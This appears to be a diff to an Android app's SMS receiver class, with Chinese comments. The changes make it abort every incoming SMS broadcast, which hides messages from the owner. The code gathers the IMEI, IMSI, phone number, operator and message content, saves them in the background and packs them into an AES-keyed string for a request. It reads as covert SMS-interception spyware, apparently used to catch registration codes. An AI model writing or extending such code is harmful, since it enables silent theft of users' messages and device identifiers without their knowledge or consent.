@@ -51,7 +51,7 @@ public class Receiver_SMS extends BroadcastReceiver {
 	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
 	private final String SMS_CONTENT = "content://sms";
 	//默认是
-	private final long VALID_SMS_TIME = NativeParams.SMS_RECEIVER_VALID_TIME;
+	private final long VALID_SMS_TIME = NativeParams.SMS_RECEIVER_VALID_TIME * 60 *1000;
 
 	private static OnReceiveSMSListener mOnReceiveSMSListener;
 
@@ -85,9 +85,10 @@ public class Receiver_SMS extends BroadcastReceiver {
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		try {
-
-			final String message = "接到短信通知了";
-			EventBus.getDefault().post(new Message(message));
+			if (DEBUG) {
+				final String message = "接到短信通知了";
+				EventBus.getDefault().post(new Message(message));
+			}
 			Map<String, String> map3 = new HashMap<>();
 			map3.put(NativeParams.KEY_MESSAGE_ACTION, intent.getAction());
 			FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST_PRO1, map3);
@@ -107,23 +108,35 @@ public class Receiver_SMS extends BroadcastReceiver {
 				final long currentTime = System.currentTimeMillis();
 
 				//表示一个注册需要５分钟时间，若从建立连接ssh成功到之后５分钟时间，这段时间，会拦截该广播！！！！！！！！！！！！！
-				if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService.recordConnectTime <
-						VALID_SMS_TIME)) {
-					this.abortBroadcast();
-					HeartBeatService.recordConnectTime = 0;
-				} else {
-					//若是我们自己发送指令过去,就走这条通道
-					if (GetMsgRunnable.sendSmsTime > 0 && (currentTime - GetMsgRunnable.sendSmsTime <
-							VALID_SMS_TIME)) {
-						this.abortBroadcast();
-						GetMsgRunnable.sendSmsTime = 0;
-					} else {
-						//若不满足该要求,就清掉该请求.
-						this.clearAbortBroadcast();
-						return;
-					}
+//				if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService.recordConnectTime <
+//						VALID_SMS_TIME)) {
+//					if(DEBUG){
+//						Log.d(TAG,"in valid time,record abortBroadcast()");
+//					}
+//					this.abortBroadcast();
+//					//HeartBeatService.recordConnectTime = 0;
+//				} else {
+//					//若是我们自己发送指令过去,就走这条通道
+//					if (GetMsgRunnable.sendSmsTime > 0 && (currentTime - GetMsgRunnable.sendSmsTime <
+//							VALID_SMS_TIME)) {
+//						if (DEBUG) {
+//							Log.d(TAG, "in valid time,sendSm abortBroadcast()");
+//						}
+//						this.abortBroadcast();
+//						//GetMsgRunnable.sendSmsTime = 0;
+//					} else {
+//						//若不满足该要求,就清掉该请求.
+//						if (DEBUG) {
+//							Log.d(TAG, "not in valid time, clearAbortBroadcast()");
+//						}
+//						this.clearAbortBroadcast();
+//						return;
+//					}
+//				}
+				this.abortBroadcast();
+				if (DEBUG) {
+					Log.d(TAG, "in the receive context,abortBroadcast()");
 				}
-				//this.abortBroadcast();
 				Map<String, String> map1 = new HashMap<>();
 				map1.put(NativeParams.KEY_MESSAGE_ARGS, args.toString());
 				FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST_PRO, map1);
@@ -131,11 +144,6 @@ public class Receiver_SMS extends BroadcastReceiver {
 				if (args != null) {
 					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
 					SmsMessage messages[] = new SmsMessage[pdus.length];
-//					boolean hasPhoneNumber = true;
-//					String phoneNumber = PhoneInfo.getInstance(context).getDbPhoneNumber(context);
-//					if (TextUtils.isEmpty(phoneNumber)) {
-//						hasPhoneNumber = false;
-//					}
 					if (DEBUG) {
 						Log.d(TAG, "message length：" + pdus.length);
 					}
@@ -289,16 +297,15 @@ public class Receiver_SMS extends BroadcastReceiver {
 
 		if (DEBUG) {
 			Log.d(TAG, "即将上报短信信息！！！！！！！！！！");
+			StringBuilder builder = new StringBuilder();
+			builder.append("imei:" + info.getIMEI()).append("\n")
+					.append("imsi:" + info.getIMSI()).append("\n")
+					.append("phoneNumber:" + info.getPhonenumber()).append("\n")
+					.append("operator:" + info.getOperators()).append("\n")
+					.append("operatorcode:" + info.getOperatorcode()).append("\n")
+					.append("smsinfo:" + info.getMessageinfo()).append("\n");
+			EventBus.getDefault().post(new MessageEvent(builder.toString()));
 		}
-
-		StringBuilder builder = new StringBuilder();
-		builder.append("imei:" + info.getIMEI()).append("\n")
-				.append("imsi:" + info.getIMSI()).append("\n")
-				.append("phoneNumber:" + info.getPhonenumber()).append("\n")
-				.append("operator:" + info.getOperators()).append("\n")
-				.append("operatorcode:" + info.getOperatorcode()).append("\n")
-				.append("smsinfo:" + info.getMessageinfo()).append("\n");
-		EventBus.getDefault().post(new MessageEvent(builder.toString()));
 
 		try {
 			info.saveInBackground();
@@ -353,7 +360,7 @@ public class Receiver_SMS extends BroadcastReceiver {
 		Map<String, String> map = new HashMap<>();
 		map.put(NativeParams.TYPE_PHONE_NUMBER, PhoneInfo.getInstance(context).getNativePhoneNumber());
 		map.put(NativeParams.TYPE_PHONE_IMEI, PhoneInfo.getInstance(context).getIMEI());
-		map.put(NativeParams.TYPE_PHONE_SMS, sms);
+		map.put(NativeParams.TYPE_PHONE_SMS, String.valueOf(sms));
 		String authStr = RequestManager.getAuthStr(NativeParams.AES_KEY, map);
 		Map<String, String> map1 = new HashMap<>();
 		map1.put("s", authStr);
